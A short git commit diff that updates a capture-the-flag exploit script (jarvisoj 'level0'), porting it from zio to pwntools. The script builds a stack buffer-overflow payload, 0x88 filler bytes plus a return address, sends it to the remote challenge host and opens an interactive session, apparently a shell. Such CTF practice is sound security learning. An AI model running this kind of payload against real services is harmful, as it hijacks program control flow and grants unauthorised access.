f5128e7115e1e3a386c7580a35e49fa26e9229a3
ZYA <zyazhb@yahoo.com>
2019-03-13 17:13:53 +0800

    Update exp.py

--- jarvisoj/0/exp.py
+++ jarvisoj/0/exp.py
@@ -1,10 +1,10 @@
-import zio
+from pwn import *
 
 junk = "A" * 0x88
-address = "\x96\x05\x40\x00\x00\x00\x00"
-payload = junk + address
+#address = "\x96\x05\x40\x00\x00\x00\x00"
+payload = junk + p64(0x400596)
 
 # Io = zio.zio("./level0")
-Io = zio.zio(("pwn2.jarvisoj.com", 9881))
-Io.write(payload)
-Io.interact()
+Io = remote(("pwn2.jarvisoj.com", 9881))
+Io.send(payload)
+Io.interactive()
